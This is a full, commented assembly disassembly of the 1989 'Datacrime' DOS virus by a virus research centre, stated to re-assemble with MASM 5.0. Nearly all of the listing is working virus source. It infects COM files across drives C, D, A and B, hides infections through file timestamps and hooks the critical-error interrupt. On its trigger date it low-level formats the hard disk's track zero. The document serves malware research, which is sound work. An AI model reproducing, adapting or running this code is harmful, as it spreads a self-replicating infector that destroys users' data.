;
; IMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM;
; :                 British Computer Virus Research Centre                   :
; :  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    :
; :  Telephone:     Domestic   0273-26105,   International  +44-273-26105    :
; :                                                                          :
; :                          The 'Datacrime' Virus                           :
; :                Disassembled by Joe Hirst,        May 1989                :
; :                                                                          :
; :                      Copyright (c) Joe Hirst 1989.                       :
; :                                                                          :
; :      This listing is only to be made available to virus researchers      :
; :                or software writers on a need-to-know basis.              :
; HMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM<
 
        ; The virus occurs attached to the end of a COM file.  The first
        ; three bytes of the program are stored in the virus, and replaced
        ; by a branch to the beginning of the virus.
 
        ; The disassembly has been tested by re-assembly using MASM 5.0.
 
        ; Addressability is maintained by taking the offset from the
        ; initial jump to the virus.  This is the length of the host minus
        ; three (length of the jump instruction).  Three is subtracted
        ; from this figure (presumably the length of the original "host"
        ; program when the virus was released).  The result is kept in
        ; register SI.  Data addresses add SI+106H (COM origin of 100H
        ; + length of jump + length of initial host) to the offset of the
        ; data item within the virus.
 
        ; Note that if it does nothing else this virus will almost certainly
        ; screw up the critical error handler because:
 
        ; 1.    There is a missing segment override on the restore of the
        ;       original segment (presumably the result of inserting such
        ;       overrides manually), and
 
        ; 2.    If the virus looks at more than one disk it will reinstall
        ;       the routine, overwriting the original saved vector with that
        ;       of its own routine.
 
CODE    SEGMENT BYTE PUBLIC 'CODE'
        ASSUME  CS:CODE,DS:CODE
 
        ORG     09AH
DW009A  DW      ?
 
        ORG     101H
DW0101  DW      ?
 
        ; Start of virus - Set up relocation factor
 
        ORG     0
START:  MOV     SI,CS:DW0101            ; Address initial jump to virus
        SUB     SI,3                    ; Length of original host (?)
        MOV     AX,SI                   ; Copy relocation factor
        CMP     AX,0                    ; Is it zero (initial release)?
        JNE     BP0012                  ; Branch if not
        JMP     BP0110                  ; Infection routine
 
        ; Restore host and test initial start month
 
BP0012: LEA     DI,DB03D5[SI+106H]      ; Address stored start of host
        MOV     BX,0100H                ; Address beginning of host program
        MOV     CX,5                    ; Word count
BP001C: MOV     AX,[DI]                 ; Get next word
        MOV     [BX],AX                 ; Replace next word
        ADD     BX,2                    ; Address next target word
        ADD     DI,2                    ; Address next stored word
        DEC     CX                      ; Reduce count
        JNZ     BP001C                  ; Repeat for each word
        MOV     AH,2AH                  ; Get date function
        INT     21H                     ; DOS service
        MOV     AL,CS:DB03EA[SI+106H]   ; Get start month
        CMP     AL,DH                   ; Is it start month yet?
        JG      BP0040                  ; Branch if not
        MOV     CS:DB03EA[SI+106H],0    ; Don't do test any more
        JMP     BP0045
 
        ; Pass control to host program
 
BP0040: MOV     BX,0100H                ; Address beginning of host program
        JMP     BX                      ; Branch to host program
 
        ; Are we in target part of year?
 
BP0045: MOV     AX,CS:DW03E8[SI+106H]   ; Get start month and day
        CMP     AX,DX                   ; Compare to actual
        JL      BP0051                  ; Branch if after start date
        JMP     BP0110                  ; Infection routine
 
        ; Is there a hard disk?
 
BP0051: MOV     AX,0                    ; Clear register
        PUSH    DS
        MOV     DS,AX                   ; Address segment zero
        MOV     BX,0106H                ; Address Int 41H segment
        MOV     AX,[BX]                 ; Get Int 41H segment
        POP     DS
        CMP     AX,0                    ; Is it zero (no hard disk)?
        JNE     BP0067                  ; Branch if not
        MOV     BX,0100H                ; Address beginning of host program
        JMP     BX                      ; Branch to host program
 
        ; Display message and format track zero, heads 0 - 8
 
BP0067: LEA     BX,DB00E7[SI+106H]      ; Address encrypted string
        MOV     CL,29H                  ; Load length of string
BP006D: MOV     DL,CS:[BX]              ; Get a character
        XOR     DL,55H                  ; Decrypt character
        MOV     AH,2                    ; Display character function
        INT     21H                     ; DOS service
        INC     BX                      ; Address next character
        DEC     CL                      ; Reduce count
        JNZ     BP006D                  ; Repeat for each character
        MOV     BX,OFFSET DW00A7+106H   ; Address format buffer (no SI?)
        MOV     CH,0                    ; Track zero
        MOV     DX,0080H                ; Head zero, first hard disk
BP0084: MOV     CH,0                    ; Track zero
        MOV     AL,0                    ; Load zero
        MOV     CL,6                    ; \ Multiply zero by 64
        SHL     AL,CL                   ; /
        MOV     CL,AL                   ; Move result (zero)
        OR      CL,1                    ; Now its one (and next line zero)
        MOV     AX,0500H                ; Format track, interleave zero
        INT     13H                     ; Disk I/O
        JB      BP009F                  ; Branch if error
        INC     DH                      ; Next head
        CMP     DH,9                    ; Is it head nine?
        JNE     BP0084                  ; Format if not
BP009F: MOV     AH,2                    ; Display character function
        MOV     DL,7                    ; Beep
        INT     21H                     ; DOS service
        JMP     BP009F                  ; Loop on beep
 
        ; Format table (required for ATs and PS/2s)
        ; Program does not in fact point to this because the reference
        ; to register SI is missing
 
DW00A7  DB      0, 01H, 0, 02H, 0, 03H, 0, 04H, 0, 05H, 0, 06H, 0, 07H, 0, 08H
        DB      0, 09H, 0, 0AH, 0, 0BH, 0, 0CH, 0, 0DH, 0, 0EH, 0, 0FH, 0, 10H
        DB      0, 11H, 0, 12H, 0, 13H, 0, 14H, 0, 15H, 0, 16H, 0, 17H, 0, 18H
        DB      0, 19H, 0, 1AH, 0, 1BH, 0, 1CH, 0, 1DH, 0, 1EH, 0, 1FH, 0, 20H
 
;        The next field decodes to:
 
;       DB      'DATACRIME VIRUS', 0AH, 0DH
;       DB      'RELEASED: 1 MARCH 1989', 0AH, 0DH
 
DB00E7  DB      11H, 14H, 01H, 14H, 16H, 07H, 1CH, 18H, 10H
        DB      75H, 03H, 1CH, 07H, 00H, 06H, 5FH, 58H
        DB      07H, 10H, 19H, 10H, 14H, 06H, 10H, 11H
        DB      6FH, 75H, 64H, 75H, 18H, 14H, 07H, 16H
        DB      1DH, 75H, 64H, 6CH, 6DH, 6CH, 5FH, 58H
 
        ; Start of infection routine
 
BP0110: MOV     AH,19H                  ; Get current disk function
        INT     21H                     ; DOS service
        MOV     CS:DB03F5[SI+106H],AL   ; Save current disk
        MOV     AH,47H                  ; Get current directory function
        MOV     DX,0                    ; Default disk
        PUSH    SI
        LEA     SI,DB03F6+1[SI+106H]    ; Original directory store
        INT     21H                     ; DOS service
        POP     SI
        MOV     CS:DB03EC[SI+106H],0    ; Set disk drive pointer to start
        JMP     BP0130                  ; Select disk drive
 
        ; Select disk drive from table
 
BP0130: CALL    BP0172                  ; Install Int 24H routine
        LEA     BX,DB03E3[SI+106H]      ; Address disk drive table
        MOV     AL,CS:DB03EC[SI+106H]   ; Get disk drive pointer
        INC     CS:DB03EC[SI+106H]      ; Update disk drive pointer
        MOV     AH,0                    ; Clear top of register
        ADD     BX,AX                   ; Add disk drive pointer
        MOV     AL,CS:[BX]              ; Get next disk drive
        MOV     DL,AL                   ; Move device for select
        CMP     AL,0FFH                 ; End of table?
        JNE     BP0151                  ; Branch if not
        JMP     BP023C                  ; Tidy up and terminate
 
BP0151: MOV     AH,0EH                  ; Select disk function
        INT     21H                     ; DOS service
        MOV     AH,47H                  ; Get current directory function
        MOV     DL,0                    ; Default drive
        PUSH    SI
        LEA     SI,DB0417+1[SI+106H]    ; Current directory path name
        INT     21H                     ; DOS service
        POP     SI
        MOV     BX,4                    ; Address critical error
        MOV     AL,CS:[BX]              ; Get critical error code
        CMP     AL,3                    ; Was it three?
        JNE     BP01B7                  ; Branch if not
        MOV     AL,0                    ; \ Set it back to zero
        MOV     CS:[BX],AL              ; /
        JMP     BP0130                  ; Select next disk drive
 
        ; Install interrupt 24H routine
 
BP0172: XOR     AX,AX                   ; Clear register
        PUSH    DS
        MOV     DS,AX                   ; Address segment zero
        MOV     BX,0090H                ; Address Int 24H vector
        MOV     AX,[BX+2]               ; Get Int 24H segment
        MOV     CS:DW03CF[SI+106H],AX   ; Save Int 24H segment
        MOV     AX,[BX]                 ; Get Int 24H offset
        MOV     CS:DW03D1[SI+106H],AX   ; Save Int 24H offset
        MOV     AX,CS                   ; Get current segment
        MOV     [BX+2],AX               ; Set new Int 24H segment
        LEA     AX,BP01AE[SI+106H]      ; Int 24H routine
        MOV     [BX],AX                 ; Set new Int 24H offset
        POP     DS
        RET
 
        ; Restore original interrupt 24H
 
BP0196: XOR     AX,AX                   ; Clear register
        PUSH    DS
        MOV     DS,AX                   ; Address segment zero
        MOV     BX,0090H                ; Address Int 24H vector
        MOV     AX,CS:DW03CF[SI+106H]   ; Get Int 24H segment
        MOV     [BX+2],AX               ; Restore Int 24H segment
        MOV     AX,DW03D1[SI+106H]      ; Get Int 24H offset (missing CS:)
        MOV     [BX],AX                 ; Restore Int 24H offset
        POP     DS
        RET
 
        ; Interrupt 24H routine
 
BP01AE: MOV     AL,3                    ; Fail the system call
        MOV     BX,4                    ; Address critical error byte
        MOV     CS:[BX],AL              ; Save code
        IRET
 
BP01B7: CALL    BP02DA                  ; Find and infect a file
        MOV     AL,CS:DB03EB[SI+106H]   ; Get infection completed switch
        CMP     AL,1                    ; Is it on?
        JNE     BP01C6                  ; Branch if not
        JMP     BP023C                  ; Tidy up and terminate
 
BP01C6: CALL    BP0260                  ; Get next directory
        JNB     BP01CE                  ; Branch if found
        JMP     BP0130                  ; Select next disk drive
 
BP01CE: MOV     CX,0040H                ; Maximum characters to copy
        PUSH    SI
        DEC     DI                      ; \
        DEC     DI                      ;  ) Address back to '*.*'
        DEC     DI                      ; /
        MOV     WORD PTR [DI],'\ '      ; Word reversed, but overwritten soon
        MOV     SI,BX                   ; Address file name
        CLD
BP01DC: LODSB                           ; \ Copy a character
        STOSB                           ; /
        DEC     CX                      ; Decrement count
        CMP     AL,0                    ; Was last character zero?
        JNE     BP01DC                  ; Next character if not
        POP     SI
        MOV     AH,3BH                  ; Change current directory function
        LEA     DX,DB0438[SI+106H]      ; Directory pathname
        INT     21H                     ; DOS service
        CALL    BP02DA                  ; Find and infect a file
        MOV     AL,CS:DB03EB[SI+106H]   ; Get infection completed switch
        CMP     AL,1                    ; Is it on?
        JE      BP023C                  ; Tidy up and terminate if yes
        CALL    BP0260                  ; Get next directory
        JNB     BP01CE                  ; Branch if found
        MOV     AH,3BH                  ; Change current directory function
        LEA     DX,DB0417[SI+106H]      ; Current directory path name
        INT     21H                     ; DOS service
        INC     CS:DB03E2[SI+106H]      ; Increment directory count
        CALL    BP0260                  ; Get next directory
        JB      BP023C                  ; Branch if not found
        MOV     AL,CS:DB03E2[SI+106H]   ; Get directory count
BP0214: CMP     AL,0                    ; Is directory count zero yet?
        JNE     BP021D                  ; Branch if not
        ADD     BX,9                    ; ???
        JMP     BP01CE                  ; ??? Add directory name to path
 
BP021D: MOV     AH,4FH                  ; Find next file function
        PUSH    AX
        INT     21H                     ; DOS service
        POP     AX
        JNB     BP0228                  ; Branch if no error
        JMP     BP0130                  ; Select next disk drive
 
BP0228: PUSH    AX
        MOV     AH,2FH                  ; Get DTA function
        INT     21H                     ; DOS service
        ADD     BX,15H                  ; Address attributes byte
        MOV     AL,10H                  ; Directory attribute
        CMP     CS:[BX],AL              ; Is it a directory?
        POP     AX
        JNE     BP021D                  ; Branch if not
        DEC     AL                      ; Decrement directory count
        JMP     BP0214
 
        ; Reset disk and directory, and pass control to host
 
BP023C: MOV     AH,0EH                  ; Select disk function
        MOV     DL,CS:DB03F5[SI+106H]   ; Get original current disk
        INT     21H                     ; DOS service
        MOV     AH,3BH                  ; Change current directory function
        LEA     DX,DB03F6[SI+106H]      ; Original directory
        INT     21H                     ; DOS service
        CALL    BP0196                  ; Restore Int 24H
        MOV     AX,SI                   ; Copy relocation factor
        CMP     AX,0                    ; Is it zero (initial release)?
        JE      BP025C                  ; Terminate 8f not
        MOV     BX,0100H                ; Address beginning of host program
        JMP     BX                      ; Branch to host program
 
        ; Terminate
 
BP025C: MOV     AH,4CH                  ; End process function
        INT     21H                     ; DOS service
 
        ; Get next directory
 
BP0260: LEA     DI,DB0438+1[SI+106H]    ; Directory pathname
        MOV     CX,003AH                ; Length to clear
        MOV     AL,0                    ; Set to zero
        CLD
        REPZ    STOSB                   ; Clear pathname area
        MOV     AH,47H                  ; Get current directory function
        PUSH    SI
        MOV     DX,0                    ; Current drive
        LEA     SI,DB0438+1[SI+106H]    ; Directory pathname
        INT     21H                     ; DOS service
        POP     SI
        CLD
        LEA     DI,DB0438+1[SI+106H]    ; Directory pathname
        MOV     CX,0040H                ; Length to search
        MOV     AL,0                    ; Search for zero
        REPNZ   SCASB                   ; Search for end of pathname
        JZ      BP0289                  ; Branch if found
        STC
        RET
 
        ; Set file name wildcard on path
 
BP0289: DEC     DI                      ; \ Back two positions
        DEC     DI                      ; /
        MOV     AL,[DI]                 ; Get character
        CMP     AL,'\'                  ; Does path end in dir delim?
        JE      BP0294                  ; Branch if yes
        INC     DI                      ; Next position
        MOV     AL,'\'                  ; Make next character a dir delim
BP0294: MOV     [DI],AL                 ; Store character
        INC     DI                      ; Next position
        MOV     AL,'*'                  ; All files
        MOV     [DI],AL                 ; Store character
        INC     DI                      ; Next position
        MOV     AL,'.'                  ; Extension
        MOV     [DI],AL                 ; Store character
        INC     DI                      ; Next position
        MOV     AL,'*'                  ; all extensions
        MOV     [DI],AL                 ; Store character
        INC     DI                      ; Next position
        LEA     DX,DB0438[SI+106H]      ; Address directory pathname
        MOV     AH,4EH                  ; Find first file function
        MOV     CX,0010H                ; Find directories
        INT     21H                     ; DOS service
        JNB     BP02B4                  ; Branch if no error
        RET
 
        ; Valid directories only
 
BP02B4: MOV     AH,2FH                  ; Get DTA function
        INT     21H                     ; DOS service
        ADD     BX,15H                  ; Address attribute byte
        MOV     AL,10H                  ; Directory attribute
        CMP     CS:[BX],AL              ; Is it a directory?
        JNE     BP02D2                  ; Branch if not
        CLC
        MOV     AH,2FH                  ; Get DTA function
        INT     21H                     ; DOS service
        ADD     BX,1EH                  ; Address directory name
        MOV     AL,'.'                  ; Prepare to test first byte
        CMP     CS:[BX],AL              ; Is it a pointer to another dir?
        JE      BP02D2                  ; Branch if yes
        RET
 
BP02D2: MOV     AH,4FH                  ; Find next file function
        INT     21H                     ; DOS service
        JNB     BP02B4                  ; Branch if no error
        STC
        RET
 
        ; Find and infect a file
 
BP02DA: MOV     CS:DB03EB[SI+106H],0    ; Set infection completed switch off
        MOV     AH,4EH                  ; Find first file function
        MOV     CX,7                    ; All files
        LEA     DX,DB03ED[SI+106H]      ; Address '*.COM'
        INT     21H                     ; DOS service
        JNB     BP02F6                  ; Branch if no error
        RET
 
BP02EF: MOV     AH,4FH                  ; Find next file function
        INT     21H                     ; DOS service
        JNB     BP02F6                  ; Branch if no error
        RET
 
        ; Exclude COMMAND.COM
 
BP02F6: MOV     BX,00A4H                ; Address seventh letter of name
        MOV     AL,[BX]                 ; Get character
        CMP     AL,'D'                  ; Is it a 'D' (as in COMMAND.COM)?
        JNE     BP0301                  ; Branch if not
        JMP     BP02EF                  ; Next file
 
        ; Is it already infected?
 
BP0301: MOV     BX,0096H                ; Address time of file
        MOV     CX,[BX]                 ; Get time of file
        ADD     BX,2                    ; Address date of file
        MOV     DX,[BX]                 ; Get date of file
        MOV     AL,CL                   ; Copy low byte of time
        AND     AL,0E0H                 ; Isolate low part of minutes
        MOV     AH,AL                   ; Copy low part of minutes
        SHR     AL,1                    ; \
        SHR     AL,1                    ;  \
        SHR     AL,1                    ;   ) Move mins to secs position
        SHR     AL,1                    ;  /
        SHR     AL,1                    ; /
        OR      AL,AH                   ; Combine with minutes
        CMP     AL,CL                   ; Compare to actual time
        JNE     BP0323                  ; Branch if different
        JMP     BP02EF                  ; Find next file
 
        ; Uninfected COM file found
 
BP0323: PUSH    CX
        PUSH    DX
        MOV     AX,CS:DW009A            ; Get low-order length
        MOV     CS:DW03D3[SI+106H],AX   ; Save low-order length
        CALL    BP03AA                  ; Remove read-only attribute
        MOV     AX,3D02H                ; Open handle (R/W) function
        MOV     DX,009EH                ; File name
        INT     21H                     ; DOS service
        MOV     BX,AX                   ; Move handle
        MOV     AH,3FH                  ; Read handle function
        LEA     DX,DB03D5[SI+106H]      ; Store area for start of host
        MOV     CX,000AH                ; Read first ten bytes
        INT     21H                     ; DOS service
        MOV     AX,4202H                ; Move file pointer (EOF) function
        XOR     CX,CX                   ; \ No displacement
        XOR     DX,DX                   ; /
        INT     21H                     ; DOS service
        MOV     CX,OFFSET ENDADR        ; Length of virus
        NOP
        LEA     DX,[SI+106H]            ; Address start of virus
        MOV     AH,40H                  ; Write handle function
        INT     21H                     ; DOS service
        MOV     AX,4200H                ; Move file pointer (start) function
        XOR     CX,CX                   ; \ No displacement
        XOR     DX,DX                   ; /
        INT     21H                     ; DOS service
        MOV     AX,CS:DW009A            ; Get low-order length
        SUB     AX,3                    ; Subtract length of jump
        MOV     CS:DW03E0[SI+106H],AX   ; Store displacement in jump
        MOV     AH,40H                  ; Write handle function
        MOV     CX,3                    ; Length of jump
        LEA     DX,DB03DF[SI+106H]      ; Address jump instruction
        INT     21H                     ; DOS service
        POP     DX
        POP     CX
        AND     CL,0E0H                 ; Isolate low part of minutes
        MOV     AL,CL                   ; Copy low part of minutes
        SHR     CL,1                    ; \
        SHR     CL,1                    ;  \
        SHR     CL,1                    ;   ) Move mins to secs position
        SHR     CL,1                    ;  /
        SHR     CL,1                    ; /
        OR      CL,AL                   ; Combine with minutes
        MOV     AX,5701H                ; Set file date & time function
        INT     21H                     ; DOS service
        MOV     AH,3EH                  ; Close handle function
        INT     21H                     ; DOS service
        CALL    BP03C1                  ; Replace attributes
        MOV     CS:DB03EB[SI+106H],1    ; Set infection completed switch on
        MOV     AH,3BH                  ; Change current directory function
        LEA     DX,DB0417[SI+106H]      ; Current directory path name
        INT     21H                     ; DOS service
        RET
 
        ; Remove read-only attribute
 
BP03AA: MOV     DX,009EH                ; Address file name
        MOV     AX,4300H                ; Get file attributes function
        INT     21H                     ; DOS service
        MOV     CS:DW03F3[SI+106H],CX   ; Save attributes
        AND     CX,00FEH                ; Set off read-only
        MOV     AX,4301H                ; Set file attributes function
        INT     21H                     ; DOS service
        RET
 
        ; Replace attributes
 
BP03C1: MOV     CX,CS:DW03F3[SI+106H]   ; Get attributes
        MOV     DX,009EH                ; Address file name
        MOV     AX,4301H                ; Set file attributes function
        INT     21H                     ; DOS service
        RET
 
DW03CF  DW      1142H                   ; Original Int 24H segment
DW03D1  DW      175DH                   ; Original Int 24H offset
DW03D3  DW      0039H                   ; Low-order length of host
DB03D5  DB      0EBH, 02EH, 090H, 'Hello -'     ; Store area for start of host
DB03DF  DB      0E9H                    ; \ Jump for host program
DW03E0  DW      0                       ; /
DB03E2  DB      0BH
DB03E3  DB      2, 3, 0, 1, 0FFH        ; Disk drive table (C, D, A, B)
DW03E8  DW      0A0CH                   ; Start month and day
DB03EA  DB      0                       ; Start month
DB03EB  DB      0                       ; Infection completed switch
DB03EC  DB      3                       ; Disk drive pointer
DB03ED  DB      '*.COM', 0
DW03F3  DW      20H                     ; File attributes
DB03F5  DB      0                       ; Original current disk
DB03F6  DB      '\', 0, 'ENTURA', 19H DUP (0)   ; Original directory
DB0417  DB      '\', 0, 'NPAK', 1BH DUP (0)     ; Current directory
DB0438  DB      '\*.*', 3CH DUP (0)             ; Directory pathname
 
        DB      000H, 02BH, 0C3H, 074H, 005H, 078H, 002H, 041H
        DB      0C3H, 049H, 0C3H, 051H, 052H, 0A1H, 014H, 000H
        DB      08BH, 00EH, 01AH, 000H, 08BH, 016H, 01CH, 000H
 
ENDADR  EQU     $
 
CODE    ENDS
 
        END     START
 
